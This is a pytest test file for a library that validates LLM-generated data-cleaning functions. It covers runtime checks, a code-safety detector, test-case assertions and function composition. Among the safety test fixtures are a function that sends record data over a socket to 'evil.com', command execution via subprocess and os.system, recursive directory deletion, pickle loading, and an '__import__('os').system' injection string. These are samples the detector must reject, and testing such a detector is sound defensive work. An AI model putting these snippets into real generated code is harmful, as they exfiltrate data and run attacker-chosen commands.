"""Tests for runtime validation of generated functions."""

import pytest
from recursive_cleaner import DataCleaner, validate_function, extract_sample_data, check_code_safety, validate_composition
from recursive_cleaner.validation import extract_modified_fields, validate_test_cases


class MockLLM:
    """Mock LLM that returns predefined responses."""

    def __init__(self, responses: list[str]):
        self.responses = iter(responses)
        self.calls = []

    def generate(self, prompt: str) -> str:
        self.calls.append(prompt)
        return next(self.responses)


# Test validate_function directly

def test_validate_function_accepts_working_code():
    """Function that works on sample data is accepted."""
    code = '''
def process_data(data):
    data["processed"] = True
    return data
'''
    sample_data = [{"name": "Alice"}, {"name": "Bob"}]
    valid, error = validate_function(code, sample_data, "process_data")
    assert valid is True
    assert error is None


def test_validate_function_rejects_wrong_return_type():
    """Function that returns non-dict is rejected."""
    code = '''
def bad_return(data):
    return data.get("name", "unknown")
'''
    sample_data = [{"name": "Alice"}]
    valid, error = validate_function(code, sample_data, "bad_return")
    assert valid is False
    assert "must return dict" in error


def test_validate_function_rejects_key_error():
    """Function with KeyError on nonexistent key is rejected."""
    code = '''
def bad_function(data):
    return data["nonexistent_key"]
'''
    sample_data = [{"name": "Alice"}]
    valid, error = validate_function(code, sample_data, "bad_function")
    assert valid is False
    assert "KeyError" in error


def test_validate_function_rejects_type_error():
    """Function with TypeError is rejected."""
    code = '''
def type_error_func(data):
    return len(data["name"]) + data["name"]  # int + str
'''
    sample_data = [{"name": "Alice"}]
    valid, error = validate_function(code, sample_data, "type_error_func")
    assert valid is False
    assert "TypeError" in error


def test_validate_function_rejects_attribute_error():
    """Function with AttributeError is rejected."""
    code = '''
def attr_error_func(data):
    return data["name"].nonexistent_method()
'''
    sample_data = [{"name": "Alice"}]
    valid, error = validate_function(code, sample_data, "attr_error_func")
    assert valid is False
    assert "AttributeError" in error


def test_validate_function_handles_empty_sample():
    """Empty sample data returns success (nothing to validate against)."""
    code = '''
def some_func(data):
    return data["will_fail"]
'''
    valid, error = validate_function(code, [], "some_func")
    assert valid is True
    assert error is None


def test_validate_function_missing_function_name():
    """Returns error if function name not found in code."""
    code = '''
def actual_name(data):
    return data
'''
    valid, error = validate_function(code, [{"a": 1}], "wrong_name")
    assert valid is False
    assert "not found" in error.lower()


def test_validate_function_syntax_error_in_code():
    """Returns error if code has syntax error."""
    code = '''
def broken_func(data
    return data
'''
    valid, error = validate_function(code, [{"a": 1}], "broken_func")
    assert valid is False
    assert "compilation failed" in error.lower() or "SyntaxError" in error


# Test extract_sample_data

def test_extract_sample_data_jsonl():
    """Extracts JSON objects from JSONL chunk."""
    chunk = '{"name": "Alice"}\n{"name": "Bob"}\n{"name": "Carol"}\n{"name": "Dave"}'
    samples = extract_sample_data(chunk)
    assert len(samples) == 3  # max_samples default is 3
    assert samples[0]["name"] == "Alice"
    assert samples[2]["name"] == "Carol"


def test_extract_sample_data_handles_invalid_lines():
    """Skips invalid JSON lines."""
    chunk = '{"valid": true}\nnot json\n{"also_valid": true}'
    samples = extract_sample_data(chunk)
    assert len(samples) == 2
    assert samples[0]["valid"] is True
    assert samples[1]["also_valid"] is True


def test_extract_sample_data_empty_chunk():
    """Returns empty list for empty chunk."""
    samples = extract_sample_data("")
    assert samples == []


# Test integration with DataCleaner

RESPONSE_WITH_BAD_FUNCTION = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="false">Data needs processing</issue>
  </issues_detected>
  <function_to_generate>
    <name>bad_processor</name>
    <docstring>Tries to access nonexistent key.</docstring>
    <code>
```python
def bad_processor(data):
    return data["nonexistent_field"]
```
    </code>
  </function_to_generate>
  <chunk_status>needs_more_work</chunk_status>
</cleaning_analysis>
'''

RESPONSE_WITH_GOOD_FUNCTION = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="false">Data needs processing</issue>
  </issues_detected>
  <function_to_generate>
    <name>good_processor</name>
    <docstring>Safely processes data.</docstring>
    <code>
```python
def good_processor(data):
    data["processed"] = True
    return data
```
    </code>
  </function_to_generate>
  <chunk_status>needs_more_work</chunk_status>
</cleaning_analysis>
'''

RESPONSE_CLEAN = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="true">Already handled</issue>
  </issues_detected>
  <chunk_status>clean</chunk_status>
</cleaning_analysis>
'''


def test_cleaner_retries_on_validation_failure(tmp_path):
    """DataCleaner retries with error feedback when validation fails."""
    test_file = tmp_path / "test.jsonl"
    test_file.write_text('{"name": "Alice"}\n{"name": "Bob"}\n')

    # First response fails validation, second succeeds, third marks clean
    mock_llm = MockLLM([RESPONSE_WITH_BAD_FUNCTION, RESPONSE_WITH_GOOD_FUNCTION, RESPONSE_CLEAN])

    cleaner = DataCleaner(
        llm_backend=mock_llm,
        file_path=str(test_file),
        chunk_size=10,
        validate_runtime=True,
    )
    cleaner.run()

    # Should have retried (at least 2 calls)
    assert len(mock_llm.calls) >= 2
    # Second call should include validation error feedback
    assert "validation" in mock_llm.calls[1].lower() or "runtime" in mock_llm.calls[1].lower()
    # Only the good function should be added
    assert len(cleaner.functions) == 1
    assert cleaner.functions[0]["name"] == "good_processor"


def test_cleaner_validation_disabled(tmp_path):
    """With validate_runtime=False, bad functions are accepted."""
    test_file = tmp_path / "test.jsonl"
    test_file.write_text('{"name": "Alice"}\n')

    mock_llm = MockLLM([RESPONSE_WITH_BAD_FUNCTION, RESPONSE_CLEAN])

    cleaner = DataCleaner(
        llm_backend=mock_llm,
        file_path=str(test_file),
        chunk_size=10,
        validate_runtime=False,
    )
    cleaner.run()

    # Bad function should be accepted since validation is disabled
    assert len(cleaner.functions) == 1
    assert cleaner.functions[0]["name"] == "bad_processor"


# Tests for check_code_safety


class TestCheckCodeSafety:
    """Tests for dangerous code detection."""

    def test_safe_code_passes(self):
        """Normal data cleaning code is accepted."""
        code = '''
import re
import json

def normalize_phone(data):
    """Normalize phone numbers to E.164 format."""
    phone = data.get("phone", "")
    digits = re.sub(r"\\D", "", phone)
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is True
        assert error is None

    def test_common_safe_imports_allowed(self):
        """Common safe imports for data cleaning are allowed."""
        code = '''
import re
import json
import datetime
import math
import collections
import itertools
from typing import Any

def process(data):
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is True

    # Dangerous imports

    def test_rejects_import_os(self):
        """Rejects import os."""
        code = '''
import os

def delete_files(data):
    os.remove(data["path"])
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "os" in error

    def test_rejects_from_os_import(self):
        """Rejects from os import ..."""
        code = '''
from os import path

def check_path(data):
    return path.exists(data["file"])
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "os" in error

    def test_rejects_import_os_path(self):
        """Rejects import os.path."""
        code = '''
import os.path

def check_path(data):
    return os.path.exists(data["file"])
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "os" in error

    def test_rejects_subprocess(self):
        """Rejects subprocess imports."""
        code = '''
import subprocess

def run_command(data):
    subprocess.run(data["cmd"], shell=True)
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "subprocess" in error

    def test_rejects_sys(self):
        """Rejects sys imports."""
        code = '''
import sys

def mess_with_path(data):
    sys.path.append(data["dir"])
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "sys" in error

    def test_rejects_shutil(self):
        """Rejects shutil imports."""
        code = '''
import shutil

def delete_dir(data):
    shutil.rmtree(data["dir"])
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "shutil" in error

    def test_rejects_pathlib(self):
        """Rejects pathlib imports."""
        code = '''
from pathlib import Path

def read_file(data):
    return Path(data["file"]).read_text()
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "pathlib" in error

    def test_rejects_socket(self):
        """Rejects socket imports (network access)."""
        code = '''
import socket

def exfiltrate(data):
    s = socket.socket()
    s.connect(("evil.com", 80))
    s.send(str(data).encode())
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "socket" in error

    def test_rejects_urllib(self):
        """Rejects urllib imports."""
        code = '''
from urllib import request

def fetch(data):
    return request.urlopen(data["url"]).read()
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "urllib" in error

    def test_rejects_pickle(self):
        """Rejects pickle imports (deserialization attacks)."""
        code = '''
import pickle

def load_data(data):
    return pickle.loads(data["payload"])
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "pickle" in error

    # Dangerous function calls

    def test_rejects_eval(self):
        """Rejects eval() calls."""
        code = '''
def dynamic_code(data):
    return eval(data["expression"])
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "eval" in error

    def test_rejects_exec(self):
        """Rejects exec() calls."""
        code = '''
def run_code(data):
    exec(data["code"])
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "exec" in error

    def test_rejects_compile(self):
        """Rejects compile() calls."""
        code = '''
def compile_code(data):
    compiled = compile(data["code"], "<string>", "exec")
    return compiled
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "compile" in error

    def test_rejects___import__(self):
        """Rejects __import__() calls."""
        code = '''
def dynamic_import(data):
    mod = __import__(data["module"])
    return mod
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "__import__" in error

    def test_rejects_open(self):
        """Rejects open() calls - functions receive data as args."""
        code = '''
def read_file(data):
    with open(data["filename"]) as f:
        return f.read()
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "open" in error

    # Syntax errors

    def test_syntax_error_returns_false(self):
        """Syntax errors are caught and reported."""
        code = '''
def broken(data
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "Syntax error" in error

    # Edge cases

    def test_allows_re_compile(self):
        """re.compile() is not the same as compile() - should be allowed."""
        code = '''
import re

def pattern_match(data):
    pattern = re.compile(r"\\d+")
    return pattern.findall(data.get("text", ""))
'''
        safe, error = check_code_safety(code)
        assert safe is True

    def test_method_calls_not_confused_with_builtins(self):
        """obj.open() should not trigger the open() check."""
        code = '''
def process(data):
    # Some object with an open method
    return data.open()
'''
        safe, error = check_code_safety(code)
        assert safe is True


# Integration test: safety check in DataCleaner

RESPONSE_WITH_DANGEROUS_IMPORT = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="false">Need to process files</issue>
  </issues_detected>
  <function_to_generate>
    <name>dangerous_processor</name>
    <docstring>Dangerously imports os.</docstring>
    <code>
```python
import os

def dangerous_processor(data):
    os.system("echo " + data["cmd"])
    return data
```
    </code>
  </function_to_generate>
  <chunk_status>needs_more_work</chunk_status>
</cleaning_analysis>
'''

RESPONSE_SAFE_FUNCTION = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="false">Need to process data</issue>
  </issues_detected>
  <function_to_generate>
    <name>safe_processor</name>
    <docstring>Safely processes data.</docstring>
    <code>
```python
def safe_processor(data):
    data["doubled"] = data.get("value", 0) * 2
    return data
```
    </code>
  </function_to_generate>
  <chunk_status>needs_more_work</chunk_status>
</cleaning_analysis>
'''


def test_cleaner_rejects_dangerous_code_and_retries(tmp_path):
    """DataCleaner rejects dangerous code and retries with feedback."""
    test_file = tmp_path / "test.jsonl"
    test_file.write_text('{"value": 42}\n')

    # First response has dangerous import, second is safe, third marks clean
    mock_llm = MockLLM([RESPONSE_WITH_DANGEROUS_IMPORT, RESPONSE_SAFE_FUNCTION, RESPONSE_CLEAN])

    events = []

    def track_events(e):
        events.append(e)

    cleaner = DataCleaner(
        llm_backend=mock_llm,
        file_path=str(test_file),
        chunk_size=10,
        on_progress=track_events,
    )
    cleaner.run()

    # Should have retried
    assert len(mock_llm.calls) >= 2
    # Retry prompt should mention safety
    assert "safety" in mock_llm.calls[1].lower()
    # Only safe function accepted
    assert len(cleaner.functions) == 1
    assert cleaner.functions[0]["name"] == "safe_processor"
    # Safety failure event emitted
    safety_events = [e for e in events if e["type"] == "safety_failed"]
    assert len(safety_events) == 1
    assert "os" in safety_events[0]["error"]


# Tests for extract_modified_fields


def test_extract_modified_fields_simple():
    """Extract single field from record assignment."""
    code = '''
def fix_phone(record: dict) -> dict:
    record["phone"] = normalize(record["phone"])
    return record
'''
    fields = extract_modified_fields(code)
    assert fields == {"phone"}


def test_extract_modified_fields_multiple():
    """Extract multiple fields from function."""
    code = '''
def clean_record(record: dict) -> dict:
    record["phone"] = normalize(record["phone"])
    record["email"] = record["email"].lower()
    return record
'''
    fields = extract_modified_fields(code)
    assert fields == {"phone", "email"}


def test_extract_modified_fields_data_param():
    """Works with 'data' parameter name too."""
    code = '''
def fix_status(data: dict) -> dict:
    data["status"] = data["status"].lower()
    return data
'''
    fields = extract_modified_fields(code)
    assert fields == {"status"}


def test_extract_modified_fields_no_assignments():
    """Returns empty set when no field assignments."""
    code = '''
def passthrough(record: dict) -> dict:
    return record
'''
    fields = extract_modified_fields(code)
    assert fields == set()


def test_extract_modified_fields_nested_not_extracted():
    """Only extracts direct record assignments, not nested."""
    code = '''
def process(record: dict) -> dict:
    temp = {}
    temp["key"] = "value"
    record["result"] = temp
    return record
'''
    fields = extract_modified_fields(code)
    assert fields == {"result"}


# Integration test: duplicate field detection in DataCleaner


def test_cleaner_allows_supplementary_function_for_same_field(tmp_path):
    """Supplementary functions for already-covered fields pass through validation."""
    test_file = tmp_path / "test.jsonl"
    test_file.write_text('{"phone": "555-1234", "status": "active"}\n')

    # First response: phone function (accepted)
    response_phone = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="false">Phone needs normalization</issue>
  </issues_detected>
  <function_to_generate>
    <name>normalize_phone</name>
    <docstring>Normalize phone numbers.</docstring>
    <code>
```python
def normalize_phone(record: dict) -> dict:
    record["phone"] = record["phone"].replace("-", "")
    return record
```
    </code>
  </function_to_generate>
  <chunk_status>needs_more_work</chunk_status>
</cleaning_analysis>
'''

    # Second response: supplementary phone function (allowed — different operation)
    response_phone_again = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="false">Phone still needs work</issue>
  </issues_detected>
  <function_to_generate>
    <name>fix_phone_format</name>
    <docstring>Fix phone format.</docstring>
    <code>
```python
def fix_phone_format(record: dict) -> dict:
    record["phone"] = "+1" + record["phone"]
    return record
```
    </code>
  </function_to_generate>
  <chunk_status>needs_more_work</chunk_status>
</cleaning_analysis>
'''

    # Third response: status function (accepted — different field)
    response_status = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="true">Phone handled</issue>
    <issue id="2" solved="false">Status needs fixing</issue>
  </issues_detected>
  <function_to_generate>
    <name>fix_status</name>
    <docstring>Fix status field.</docstring>
    <code>
```python
def fix_status(record: dict) -> dict:
    record["status"] = record["status"].lower()
    return record
```
    </code>
  </function_to_generate>
  <chunk_status>needs_more_work</chunk_status>
</cleaning_analysis>
'''

    response_clean = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="true">Phone handled</issue>
    <issue id="2" solved="true">Status handled</issue>
  </issues_detected>
  <chunk_status>clean</chunk_status>
</cleaning_analysis>
'''

    mock_llm = MockLLM([response_phone, response_phone_again, response_status, response_clean])

    cleaner = DataCleaner(
        llm_backend=mock_llm,
        file_path=str(test_file),
        chunk_size=10,
        validate_runtime=True,
    )
    cleaner.run()

    # All 3 functions accepted: supplementary phone function allowed through
    assert len(cleaner.functions) == 3
    function_names = [f["name"] for f in cleaner.functions]
    assert "normalize_phone" in function_names
    assert "fix_phone_format" in function_names
    assert "fix_status" in function_names


def test_cross_chunk_supplementary_function_allowed(tmp_path):
    """Supplementary functions for already-handled fields are allowed across chunks."""
    test_file = tmp_path / "test.jsonl"
    # Two chunks (chunk_size=1 means 1 record per chunk)
    test_file.write_text('{"phone": "555-1234"}\n{"phone": "555-5678"}\n')

    # Chunk 1: generate phone function, then clean
    response_phone = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="false">Phone needs normalization</issue>
  </issues_detected>
  <function_to_generate>
    <name>normalize_phone</name>
    <docstring>Normalize phone numbers.</docstring>
    <code>
```python
def normalize_phone(record: dict) -> dict:
    record["phone"] = record["phone"].replace("-", "")
    return record
```
    </code>
  </function_to_generate>
  <chunk_status>needs_more_work</chunk_status>
</cleaning_analysis>
'''
    response_clean = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="true">Phone handled</issue>
  </issues_detected>
  <chunk_status>clean</chunk_status>
</cleaning_analysis>
'''
    # Chunk 2: supplementary phone function (allowed through — different operation)
    response_phone_again = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="false">Phone needs formatting</issue>
  </issues_detected>
  <function_to_generate>
    <name>format_phone</name>
    <docstring>Format phone numbers.</docstring>
    <code>
```python
def format_phone(record: dict) -> dict:
    record["phone"] = "+1" + record["phone"]
    return record
```
    </code>
  </function_to_generate>
  <chunk_status>needs_more_work</chunk_status>
</cleaning_analysis>
'''

    mock_llm = MockLLM([response_phone, response_clean, response_phone_again, response_clean])
    events = []

    cleaner = DataCleaner(
        llm_backend=mock_llm,
        file_path=str(test_file),
        chunk_size=1,
        validate_runtime=True,
        on_progress=lambda e: events.append(e),
    )
    cleaner.run()

    # Both functions accepted: supplementary phone function allowed cross-chunk
    assert len(cleaner.functions) == 2
    function_names = [f["name"] for f in cleaner.functions]
    assert "normalize_phone" in function_names
    assert "format_phone" in function_names

    # Should still emit a duplicate_field event (observability)
    dup_events = [e for e in events if e["type"] == "duplicate_field"]
    assert len(dup_events) >= 1
    assert "phone" in dup_events[0]["fields"]


# Tests for validate_test_cases


class TestValidateTestCases:
    """Tests for LLM-provided test assertion validation."""

    GOOD_CODE = '''
def normalize_phone(record: dict) -> dict:
    phone = record.get("phone", "")
    if isinstance(phone, str):
        record["phone"] = phone.replace("-", "").replace(" ", "")
    return record
'''

    def test_all_assertions_pass(self):
        """All passing assertions return (True, None)."""
        test_cases = [
            'normalize_phone({"phone": "555-1234"})["phone"] == "5551234"',
            'normalize_phone({"phone": "555 1234"})["phone"] == "5551234"',
            'normalize_phone({"phone": "5551234"})["phone"] == "5551234"',
        ]
        valid, error = validate_test_cases(self.GOOD_CODE, test_cases, "normalize_phone")
        assert valid is True
        assert error is None

    def test_assertion_evaluates_to_false(self):
        """Assertion that evaluates to False is caught."""
        test_cases = [
            'normalize_phone({"phone": "555-1234"})["phone"] == "WRONG"',
        ]
        valid, error = validate_test_cases(self.GOOD_CODE, test_cases, "normalize_phone")
        assert valid is False
        assert "Test 1 failed" in error

    def test_assertion_raises_exception(self):
        """Assertion that raises an exception is caught."""
        test_cases = [
            'normalize_phone({"phone": "555-1234"})["nonexistent"] == "x"',
        ]
        valid, error = validate_test_cases(self.GOOD_CODE, test_cases, "normalize_phone")
        assert valid is False
        assert "KeyError" in error

    def test_empty_test_cases_passes(self):
        """Empty test case list returns (True, None)."""
        valid, error = validate_test_cases(self.GOOD_CODE, [], "normalize_phone")
        assert valid is True
        assert error is None

    def test_function_not_found(self):
        """Wrong function name returns error."""
        test_cases = ['wrong_name({"a": 1}) is not None']
        valid, error = validate_test_cases(self.GOOD_CODE, test_cases, "wrong_name")
        assert valid is False
        assert "not found" in error

    def test_compilation_failure(self):
        """Bad code that can't compile returns error."""
        bad_code = "def broken(data\n    return data"
        test_cases = ['broken({"a": 1}) is not None']
        valid, error = validate_test_cases(bad_code, test_cases, "broken")
        assert valid is False
        assert "compilation failed" in error.lower() or "SyntaxError" in error

    def test_unsafe_assertion_rejected(self):
        """Assertions with dangerous code are rejected."""
        test_cases = [
            'eval("1+1") == 2',
        ]
        valid, error = validate_test_cases(self.GOOD_CODE, test_cases, "normalize_phone")
        assert valid is False
        assert "Unsafe" in error or "eval" in error

    def test_unsafe_import_in_assertion(self):
        """Assertions with dangerous imports are rejected."""
        test_cases = [
            '__import__("os").system("echo pwned")',
        ]
        valid, error = validate_test_cases(self.GOOD_CODE, test_cases, "normalize_phone")
        assert valid is False
        assert "Unsafe" in error or "__import__" in error

    def test_second_assertion_fails(self):
        """Reports correct test number when later assertion fails."""
        test_cases = [
            'normalize_phone({"phone": "555-1234"})["phone"] == "5551234"',
            'normalize_phone({"phone": "555-1234"})["phone"] == "WRONG"',
        ]
        valid, error = validate_test_cases(self.GOOD_CODE, test_cases, "normalize_phone")
        assert valid is False
        assert "Test 2 failed" in error

    def test_function_with_imports(self):
        """Functions that need imports work correctly."""
        code = '''
import re

def clean_text(record: dict) -> dict:
    text = record.get("text", "")
    record["text"] = re.sub(r"\\s+", " ", text).strip()
    return record
'''
        test_cases = [
            'clean_text({"text": "hello  world"})["text"] == "hello world"',
            'clean_text({"text": "  spaced  "})["text"] == "spaced"',
        ]
        valid, error = validate_test_cases(code, test_cases, "clean_text")
        assert valid is True
        assert error is None


# Integration test: test case validation in DataCleaner

RESPONSE_WITH_FAILING_TESTS = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="false">Phone numbers need normalization</issue>
  </issues_detected>
  <function_to_generate>
    <name>normalize_phone</name>
    <docstring>Normalize phone numbers.</docstring>
    <code>
```python
def normalize_phone(record: dict) -> dict:
    record["phone"] = record.get("phone", "").lower()
    return record
```
    </code>
    <test_cases>
      <assertion>normalize_phone({"phone": "555-1234"})["phone"] == "5551234"</assertion>
    </test_cases>
  </function_to_generate>
  <chunk_status>needs_more_work</chunk_status>
</cleaning_analysis>
'''

RESPONSE_WITH_PASSING_TESTS = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="false">Phone numbers need normalization</issue>
  </issues_detected>
  <function_to_generate>
    <name>normalize_phone</name>
    <docstring>Normalize phone numbers.</docstring>
    <code>
```python
def normalize_phone(record: dict) -> dict:
    phone = record.get("phone", "")
    if isinstance(phone, str):
        record["phone"] = phone.replace("-", "")
    return record
```
    </code>
    <test_cases>
      <assertion>normalize_phone({"phone": "555-1234"})["phone"] == "5551234"</assertion>
      <assertion>normalize_phone({"phone": "5551234"})["phone"] == "5551234"</assertion>
    </test_cases>
  </function_to_generate>
  <chunk_status>needs_more_work</chunk_status>
</cleaning_analysis>
'''


def test_cleaner_retries_on_test_case_failure(tmp_path):
    """DataCleaner retries when LLM-provided test cases fail."""
    test_file = tmp_path / "test.jsonl"
    test_file.write_text('{"phone": "555-1234"}\n{"phone": "555-5678"}\n')

    # First: tests fail (lower() != "5551234"), second: tests pass, third: clean
    mock_llm = MockLLM([RESPONSE_WITH_FAILING_TESTS, RESPONSE_WITH_PASSING_TESTS, RESPONSE_CLEAN])

    events = []
    cleaner = DataCleaner(
        llm_backend=mock_llm,
        file_path=str(test_file),
        chunk_size=10,
        validate_runtime=True,
        on_progress=lambda e: events.append(e),
    )
    cleaner.run()

    # Should have retried
    assert len(mock_llm.calls) >= 2
    # Retry prompt should mention test case failure
    assert any("test" in call.lower() and "bug" in call.lower() for call in mock_llm.calls[1:])
    # Only the working function accepted
    assert len(cleaner.functions) == 1
    assert cleaner.functions[0]["name"] == "normalize_phone"
    # test_case_failed event emitted
    tc_events = [e for e in events if e["type"] == "test_case_failed"]
    assert len(tc_events) == 1


def test_cleaner_accepts_function_with_passing_tests(tmp_path):
    """DataCleaner accepts function when all test cases pass."""
    test_file = tmp_path / "test.jsonl"
    test_file.write_text('{"phone": "555-1234"}\n')

    mock_llm = MockLLM([RESPONSE_WITH_PASSING_TESTS, RESPONSE_CLEAN])

    cleaner = DataCleaner(
        llm_backend=mock_llm,
        file_path=str(test_file),
        chunk_size=10,
        validate_runtime=True,
    )
    cleaner.run()

    # Function accepted on first try
    assert len(cleaner.functions) == 1
    assert cleaner.functions[0]["name"] == "normalize_phone"


# --- Composition testing ---


class TestValidateComposition:
    """Tests for validate_composition function."""

    def test_compatible_functions_pass(self):
        """Functions that compose cleanly return success."""
        functions = [
            {
                "name": "normalize_status",
                "code": 'def normalize_status(record):\n    record["status"] = record.get("status", "").lower()\n    return record',
            },
            {
                "name": "normalize_name",
                "code": 'def normalize_name(record):\n    record["name"] = record.get("name", "").strip()\n    return record',
            },
        ]
        sample = [{"name": " Alice ", "status": "ACTIVE"}, {"name": "Bob", "status": "Pending"}]
        ok, error = validate_composition(functions, sample, mode="structured")
        assert ok is True
        assert error is None

    def test_type_mismatch_caught(self):
        """Catches when function A returns string instead of dict."""
        functions = [
            {
                "name": "break_output",
                "code": 'def break_output(record):\n    return record.get("name", "")',
            },
            {
                "name": "needs_dict",
                "code": 'def needs_dict(record):\n    record["x"] = 1\n    return record',
            },
        ]
        sample = [{"name": "Alice"}]
        ok, error = validate_composition(functions, sample, mode="structured")
        assert ok is False
        assert "expected dict" in error
        assert "break_output" in error

    def test_runtime_error_caught(self):
        """Catches when function B crashes on output of function A."""
        stringify_code = (
            "def stringify_weight(record):\n"
            "    record['weight'] = str(record.get('weight', 0)) + ' kg'\n"
            "    return record"
        )
        double_code = (
            "def double_weight(record):\n"
            "    record['weight'] = float(record['weight']) * 2\n"
            "    return record"
        )
        functions = [
            {"name": "stringify_weight", "code": stringify_code},
            {"name": "double_weight", "code": double_code},
        ]
        sample = [{"weight": 75}]
        ok, error = validate_composition(functions, sample, mode="structured")
        assert ok is False
        assert "double_weight" in error
        assert "ValueError" in error

    def test_text_mode_composition(self):
        """Functions compose correctly in text mode."""
        functions = [
            {
                "name": "uppercase_text",
                "code": "def uppercase_text(text):\n    return text.upper()",
            },
            {
                "name": "strip_text",
                "code": "def strip_text(text):\n    return text.strip()",
            },
        ]
        ok, error = validate_composition(functions, "  hello world  ", mode="text")
        assert ok is True
        assert error is None

    def test_text_mode_type_mismatch(self):
        """Catches text mode function returning non-string."""
        functions = [
            {
                "name": "break_text",
                "code": "def break_text(text):\n    return len(text)",
            },
        ]
        ok, error = validate_composition(functions, "hello", mode="text")
        assert ok is False
        assert "expected str" in error

    def test_empty_functions_pass(self):
        """Empty function list returns success."""
        ok, error = validate_composition([], [{"a": 1}])
        assert ok is True

    def test_empty_data_pass(self):
        """Empty data returns success."""
        functions = [{"name": "f", "code": "def f(r):\n    return r"}]
        ok, error = validate_composition(functions, [])
        assert ok is True

    def test_compilation_failure(self):
        """Catches syntax errors in function code."""
        functions = [{"name": "bad", "code": "def bad(record):\n    return record["}]
        ok, error = validate_composition(functions, [{"a": 1}])
        assert ok is False
        assert "Compilation failed" in error
